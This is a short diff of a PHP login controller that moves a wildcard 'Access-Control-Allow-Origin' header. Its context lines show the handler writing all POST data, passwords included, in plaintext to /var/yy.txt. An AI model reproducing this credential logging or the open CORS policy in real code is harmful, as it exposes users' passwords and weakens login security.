@@ -105,11 +105,12 @@ class ApiloginAction extends CommonAction{
         }
     }
     public function login_name_pw(){
+        header("Access-Control-Allow-Origin: *");
         $dataall = $this->_post();
         $open=fopen('/var/yy.txt',"a" );
         fwrite($open,var_export($dataall,true));
         fclose($open);
-        header("Access-Control-Allow-Origin: *");
+
        if(!trim($this->_post('mobile')) || !trim($this->_post('password'))){
             $rs = array(
                 'success'=>false,
